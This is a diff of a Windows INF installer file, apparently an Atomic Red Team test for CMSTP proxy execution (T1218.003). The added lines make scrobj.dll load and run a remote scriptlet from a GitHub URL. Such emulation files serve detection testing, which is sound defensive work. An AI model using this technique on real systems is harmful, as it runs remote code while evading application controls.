@@ -1,12 +1,14 @@
 [version]
-Signature=$CHICAGO$
+Signature=$chicago$
+AdvancedINF=2.5
 
-[DefaultInstall]
-CustomDestination=MyCustomDestinationSection
-RunPreSetupCommands=RunCommandsSection
+[DefaultInstall_SingleUser]
+UnRegisterOCXs=UnRegisterOCXSection
 
-[MyCustomDestinationSection]
-49000,49001=49002
+[UnRegisterOCXSection]
+%11%\scrobj.dll,NI,https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.003/src/T1218.003.sct
 
-[RunCommandsSection]
-"C:\\Windows\\System32\\cmd.exe /c echo Hello, World!"
+[Strings]
+AppAct = "SOFTWARE\Microsoft\Connection Manager"
+ServiceName="Yay"
+ShortSvcName="Yay"
